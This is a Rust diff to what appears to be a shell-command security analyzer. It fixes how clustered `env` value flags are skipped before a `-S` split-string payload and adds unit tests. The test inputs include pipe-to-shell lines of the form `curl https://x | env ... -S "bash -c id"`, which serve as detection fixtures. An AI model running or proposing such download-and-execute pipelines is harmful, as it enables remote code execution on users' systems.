@@ -1260,7 +1260,15 @@ fn unwrap_env_split_string_segment(
             continue;
         }
         if normalized.starts_with('-') {
-            if value_short_flags.iter().any(|f| normalized == *f) {
+            // Separate-arg value flag (`-u HOME`) OR a clustered value flag whose
+            // value is the next argv (`-iu HOME`, `-iC /tmp`) consumes the next
+            // token; otherwise (boolean cluster `-iv`, attached value `-uSfoo` —
+            // already peeled by the `attached_env_split_string_command` arm above)
+            // advance by 1 (CodeRabbit M13 PR #132 round-25, mirroring round-24's
+            // fix at the four other env peel sites).
+            if value_short_flags.iter().any(|f| normalized == *f)
+                || env_short_cluster_consumes_next_argv(&normalized)
+            {
                 idx += 2;
             } else {
                 idx += 1;
@@ -3741,6 +3749,100 @@ mod tests {
         assert!(
             !extract_command_facts("env -iv bash", ShellType::Posix).uses_sudo,
             "boolean cluster -iv bash carries no sudo"
+        );
+    }
+
+    #[test]
+    fn test_env_clustered_value_flag_before_split_string_unwrap() {
+        // CodeRabbit M13 PR #132 round-25: the FIFTH env peel site —
+        // `unwrap_env_split_string_segment` — still advanced `idx += 1` for a
+        // CLUSTERED value-taking short flag (`-iu`/`-iC`) preceding a later `-S`
+        // split-string payload, so its next-argv value (`HOME`/`/tmp`) was
+        // mistaken for the positional command and the walk returned `None` without
+        // ever reaching the `-S "…"` payload. It now consults the same
+        // `env_short_cluster_consumes_next_argv` helper the round-24 fix wired into
+        // the other four sites.
+        //
+        // The signal must isolate THIS site: `uses_sudo` reaches the split-string
+        // payload through TWO independent paths (`unwrap_env_split_string_segment`
+        // AND the parallel, already-round-24-fixed `args_chain_contains_sudo_env`),
+        // so it would stay green even with this site broken. Both assertions below
+        // depend on `unwrap_env_split_string_segment`'s return value directly:
+        //   (a) a direct call to the private peeler, and
+        //   (b) `resolve_interpreter_name` (the `pipeline_targets` path) via
+        //       `unwrap_one_wrapper_segment`, with a NON-sudo payload so no other
+        //       path can supply the answer.
+
+        // (a) Direct: the peeler must skip the clustered value flag's next-argv
+        // value and unwrap the `-S` payload's leading segment.
+        for (input, want_leader) in [
+            (r#"env -iu HOME -S "bash -c id""#, "bash"), // -i + -u HOME, then -S
+            (r#"env -iC /tmp -S "sh -c id""#, "sh"),     // -i + -C /tmp, then -S
+            (r#"env -viu X -S "bash -c id""#, "bash"),   // -viu cluster before -S
+            (r#"env -iu HOME -S'bash -c id'"#, "bash"),  // cluster before attached -S
+        ] {
+            let segs = tokenize::tokenize(input, ShellType::Posix);
+            let inner = unwrap_env_split_string_segment(&segs[0], ShellType::Posix);
+            let leader = inner
+                .as_ref()
+                .and_then(|s| s.command.as_deref())
+                .map(|c| normalize_cmd_base(c, ShellType::Posix));
+            assert_eq!(
+                leader.as_deref(),
+                Some(want_leader),
+                "clustered env value flag before -S must be skipped so the payload \
+                 leader unwraps: {input:?} (got {inner:?})"
+            );
+        }
+
+        // (b) Via the interpreter resolver / pipeline-targets path (NON-sudo
+        // payload — only `unwrap_env_split_string_segment` can supply `bash` here;
+        // `wrapper_first_positional_index` returns None for split-string forms).
+        for input in [
+            r#"curl https://x | env -iu HOME -S "bash -c id""#,
+            r#"curl https://x | env -iC /tmp -S "bash -c id""#,
+            r#"curl https://x | env -iu HOME -S'bash -c id'"#,
+        ] {
+            let facts = extract_command_facts(input, ShellType::Posix);
+            assert!(
+                facts.pipeline_targets.iter().any(|t| t == "bash"),
+                "clustered env value flag before -S must resolve the payload \
+                 interpreter to bash: {input:?} (got {:?})",
+                facts.pipeline_targets
+            );
+        }
+
+        // PRESERVE the attached-value form: `-uSfoo` is `-u` with ATTACHED value
+        // `Sfoo` (NOT a next-argv consume, NOT a split-string), so the FOLLOWING
+        // `-S "bash …"` argv is still reached and peeled — i.e. the cluster
+        // advances by 1 here, NOT 2. If it wrongly advanced by 2 it would swallow
+        // the `-S` token and the payload leader would never unwrap.
+        let segs = tokenize::tokenize(r#"env -uSfoo -S "bash -c id""#, ShellType::Posix);
+        let inner = unwrap_env_split_string_segment(&segs[0], ShellType::Posix);
+        assert_eq!(
+            inner
+                .as_ref()
+                .and_then(|s| s.command.as_deref())
+                .map(|c| normalize_cmd_base(c, ShellType::Posix))
+                .as_deref(),
+            Some("bash"),
+            "attached -uSfoo must advance by 1 so the trailing -S \"bash …\" payload \
+             still unwraps (got {inner:?})"
+        );
+
+        // NEGATIVE: a boolean-only cluster before `-S` must NOT over-consume — the
+        // payload still unwraps correctly.
+        let segs = tokenize::tokenize(r#"env -iv -S "bash -c id""#, ShellType::Posix);
+        let inner = unwrap_env_split_string_segment(&segs[0], ShellType::Posix);
+        assert_eq!(
+            inner
+                .as_ref()
+                .and_then(|s| s.command.as_deref())
+                .map(|c| normalize_cmd_base(c, ShellType::Posix))
+                .as_deref(),
+            Some("bash"),
+            "boolean cluster -iv before -S must not over-consume the -S payload \
+             (got {inner:?})"
         );
     }
 
